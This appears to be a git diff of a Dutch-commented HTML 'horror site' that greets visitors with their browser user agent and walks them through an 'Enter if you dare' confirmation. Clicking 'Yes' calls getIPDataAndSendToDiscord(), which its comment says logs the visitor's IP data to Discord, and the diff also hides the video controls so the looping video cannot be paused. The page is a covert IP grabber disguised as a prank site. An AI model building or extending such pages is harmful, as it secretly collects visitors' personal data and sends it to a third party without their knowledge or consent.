@@ -29,6 +29,7 @@
             margin-bottom: 30px;
         }
         .container {
+            display: none; /* Verberg container standaard */
             max-width: 600px;
             padding: 0 20px;
         }
@@ -58,26 +59,26 @@
 </head>
 <body>
     <!-- Begroeting met horror en getypt effect -->
-    <div id="horrorText" style="visibility: hidden;"></div>
+    <div id="horrorText"></div>
 
     <!-- Verberg de container totdat de begroeting is voltooid -->
-    <div id="container" class="container" style="display: none;">
+    <div id="container" class="container">
         <img src="horror_image.jpg" alt="Horror Image" class="horror-img">
         <h1>Welcome to the Horror Site</h1>
         <p>Are you brave enough to explore the dark corners of this website?</p>
-        <a href="#" id="enterBtn" class="btn">Enter if you dare</a>
+        <button id="enterBtn" class="btn">Enter if you dare</button>
     </div>
 
     <!-- Bevestigingsscherm -->
-    <div id="confirmation">
+    <div id="confirmation" style="display: none;">
         <h1>Are you sure?</h1>
         <button id="yesBtn" class="btn">Yes</button>
         <button id="noBtn" class="btn">No</button>
     </div>
 
     <!-- Videospeler -->
-    <div id="video-container">
-        <video id="video" width="640" height="360" controls>
+    <div id="video-container" style="display: none;">
+        <video id="video" width="640" height="360" controls autoplay loop>
             <source src="vid.mp4" type="video/mp4">
             Your browser does not support the video tag.
         </video>
@@ -163,29 +164,28 @@
             var horrorText = document.getElementById('horrorText');
             var message = 'Welcome ' + navigator.userAgent + '...';
             simulateTyping(horrorText, message, 50, function() {
-                setTimeout(function() {
-                    document.getElementById('container').style.display = 'block';
-                    document.getElementById('horrorText').style.display = 'none';
-                }, 1500);
+                document.getElementById('container').style.display = 'block'; // Laat de container zien na de begroeting
             });
 
             // Voeg een click event toe aan de "Enter if you dare" knop
             document.getElementById('enterBtn').addEventListener('click', function() {
-                document.getElementById('container').style.display = 'none';
-                document.getElementById('confirmation').style.display = 'block';
+                document.getElementById('confirmation').style.display = 'block'; // Toon bevestigingsscherm na klikken
             });
 
             // Voeg click events toe aan de "Yes" en "No" knoppen
             document.getElementById('yesBtn').addEventListener('click', function() {
-                document.getElementById('confirmation').style.display = 'none';
-                document.getElementById('video-container').style.display = 'block';
-                document.getElementById('video').play();
-                getIPDataAndSendToDiscord();
+                getIPDataAndSendToDiscord(); // Log IP-gegevens naar Discord
+                document.getElementById('confirmation').style.display = 'none'; // Verberg bevestigingsscherm
+                document.getElementById('video-container').style.display = 'block'; // Laat de videospeler zien
             });
 
             document.getElementById('noBtn').addEventListener('click', function() {
-                document.getElementById('container').style.display = 'block';
-                document.getElementById('confirmation').style.display = 'none';
+                document.getElementById('confirmation').style.display = 'none'; // Verberg bevestigingsscherm
+            });
+
+            // Voorkom dat de video kan worden gepauzeerd of bediend
+            document.getElementById('video').addEventListener('play', function() {
+                this.controls = false;
             });
         };
     </script>
